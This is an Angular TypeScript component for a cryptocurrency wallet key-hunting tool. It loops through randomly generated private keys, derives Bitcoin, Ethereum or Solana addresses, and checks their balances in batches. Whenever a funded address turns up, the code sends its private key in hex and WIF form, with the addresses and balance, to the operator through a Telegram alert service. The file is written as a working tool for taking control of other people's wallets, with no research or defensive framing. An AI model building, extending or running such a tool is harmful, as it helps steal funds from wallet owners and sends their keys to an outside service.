// src/app/pages/explorer/explorer.component.ts
import { Component, OnDestroy } from '@angular/core';
import { KeyGeneratorService } from '../../services/crypto/key-generator.service';
import { MultiChainBalanceService } from '../../services/balance/multi-chain-balance.service';
import { TelegramService } from '../../services/core/telegram.service';
import { BitcoinService } from '../../services/crypto/bitcoin.service';
import { EthereumService } from '../../services/crypto/ethereum.service';
import { SolanaService } from '../../services/crypto/solana.service';
import { ChainId, GeneratedAddress, CHAINS, ADDRESS_LABELS } from '../../types/chains';

interface KeyEntry {
  privateKeyHex: string;
  privateKeyWif?: string;
  addresses: GeneratedAddress[];
  hasBalance: boolean;
  totalBalance: number;
}

@Component({
  selector: 'app-explorer',
  templateUrl: './explorer.component.html'
})
export class ExplorerComponent implements OnDestroy {
  selectedChain: ChainId = 'btc';
  isRunning = false;
  entries: KeyEntry[] = [];
  keysChecked = 0;
  keysWithBalance = 0;
  totalFound = 0;
  notificationsSent = 0;
  currentStatus = '';
  batchSize = 10;
  
  private stopFlag = false;

  readonly chains = ['btc', 'eth', 'sol'] as ChainId[];
  readonly chainNames = { btc: 'Bitcoin', eth: 'Ethereum', sol: 'Solana' };
  readonly addressLabels = ADDRESS_LABELS;

  constructor(
    private keyGen: KeyGeneratorService,
    private balanceService: MultiChainBalanceService,
    private telegram: TelegramService,
    private btcService: BitcoinService,
    private ethService: EthereumService,
    private solService: SolanaService
  ) {}

  ngOnDestroy(): void {
    this.stop();
  }

  async start(): Promise<void> {
    if (this.isRunning) return;
    this.isRunning = true;
    this.stopFlag = false;

    while (!this.stopFlag) {
      await this.processBatch();
      await this.delay(100);
    }

    this.isRunning = false;
    this.currentStatus = 'Stopped';
  }

  private async processBatch(): Promise<void> {
    const batch: KeyEntry[] = [];
    const addressMap = new Map<string, { entry: KeyEntry; addrIndex: number }>();

    this.currentStatus = `Generating ${this.batchSize} keys...`;

    for (let i = 0; i < this.batchSize; i++) {
      const privateKey = this.keyGen.generateRandomKey();
      const addresses = await this.generateAddresses(privateKey);
      
      let wif: string | undefined;
      if (this.selectedChain === 'btc') {
        try { wif = await this.btcService.getWIF(privateKey); } catch {}
      }

      const entry: KeyEntry = {
        privateKeyHex: privateKey,
        privateKeyWif: wif,
        addresses,
        hasBalance: false,
        totalBalance: 0
      };

      batch.push(entry);
      
      addresses.forEach((addr, idx) => {
        addressMap.set(addr.address, { entry, addrIndex: idx });
      });
    }

    this.currentStatus = `Checking ${addressMap.size} addresses...`;
    
    const allAddresses = Array.from(addressMap.keys());
    const results = await this.balanceService.checkBatch(this.selectedChain, allAddresses);

    for (const [address, data] of Object.entries(results)) {
      const mapping = addressMap.get(address);
      if (mapping) {
        mapping.entry.addresses[mapping.addrIndex].balance = data.balance;
        mapping.entry.addresses[mapping.addrIndex].hasActivity = data.hasActivity;
        mapping.entry.addresses[mapping.addrIndex].checked = true;
        
        if (data.balance > 0) {
          mapping.entry.hasBalance = true;
          mapping.entry.totalBalance += data.balance;
        }
      }
    }

    this.keysChecked += batch.length;

    for (const entry of batch) {
      if (entry.hasBalance) {
        this.keysWithBalance++;
        this.totalFound += entry.totalBalance;
        this.entries.unshift(entry);
        
        this.currentStatus = `BALANCE FOUND! ${entry.totalBalance.toFixed(8)} ${this.selectedChain.toUpperCase()}`;
        
        await this.telegram.sendBalanceAlert({
          privateKeyHex: entry.privateKeyHex,
          privateKeyWif: entry.privateKeyWif,
          addresses: entry.addresses,
          totalBalance: entry.totalBalance,
          source: 'explorer'
        });
        this.notificationsSent++;
      }
    }

    if (this.entries.length > 50) {
      this.entries = this.entries.slice(0, 50);
    }

    this.currentStatus = `Checked ${this.keysChecked} keys...`;
  }

  private async generateAddresses(privateKey: string): Promise<GeneratedAddress[]> {
    if (this.selectedChain === 'btc') {
      return await this.btcService.generateAddresses(privateKey);
    } else if (this.selectedChain === 'eth') {
      const eth = await this.ethService.generateAddress(privateKey);
      return [eth];
    } else if (this.selectedChain === 'sol') {
      const sol = await this.solService.generateAddress(privateKey);
      return [sol];
    }
    return [];
  }

  stop(): void {
    this.stopFlag = true;
  }

  clear(): void {
    this.entries = [];
    this.keysChecked = 0;
    this.keysWithBalance = 0;
    this.totalFound = 0;
    this.notificationsSent = 0;
    this.currentStatus = '';
  }

  selectChain(chain: ChainId): void {
    if (this.isRunning) return;
    this.selectedChain = chain;
    this.clear();
  }

  getExplorerUrl(chain: string, address: string): string {
    const config = CHAINS[chain as keyof typeof CHAINS];
    return config ? config.explorer + address : '#';
  }

  formatBalance(balance: number): string {
    if (balance === 0) return '0';
    if (balance < 0.00001) return balance.toExponential(4);
    return balance.toFixed(8).replace(/\.?0+$/, '');
  }

  copyToClipboard(text: string): void {
    navigator.clipboard.writeText(text);
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
